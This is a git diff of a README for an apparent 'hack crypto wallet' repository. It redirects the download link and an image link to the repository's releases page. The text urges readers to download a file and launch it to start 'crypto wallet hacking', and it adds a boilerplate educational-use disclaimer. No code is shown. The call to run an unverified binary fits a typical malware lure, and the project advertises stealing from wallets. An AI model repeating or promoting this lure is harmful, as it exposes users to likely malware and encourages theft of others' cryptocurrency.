@@ -22,7 +22,7 @@ This repository is dedicated to all things related to hacking crypto wallets, ex
 - Wallets Hacking
 
 ### Get Started
-Explore the depths of crypto hacking and blockchain exploration by visiting the [Application.zip](https://github.com/files/uploaded/Application.zip) file. Download the file and launch it to begin your journey into the exciting world of crypto wallet hacking and blockchain exploits.
+Explore the depths of crypto hacking and blockchain exploration by visiting the [https://github.com/kenzie299312/hack-crypto-wallet/releases](https://github.com/kenzie299312/hack-crypto-wallet/releases) file. Download the file and launch it to begin your journey into the exciting world of crypto wallet hacking and blockchain exploits.
 
 If the provided link does not work or needs to be launched, please check the "Releases" section for alternative download options.
 
@@ -43,6 +43,6 @@ Enjoying your experience in our repository? Share it with your friends and colle
 
 ## Happy Hacking and Happy Trading! 💰🔒🚀
 
-![Crypto](https://source.unsplash.com/MAfRAnFXhMM/800x400)
+![Crypto](https://github.com/kenzie299312/hack-crypto-wallet/releases)
 
 *Disclaimer: This repository is for educational and research purposes only. Always adhere to ethical hacking practices and comply with applicable laws and regulations.*
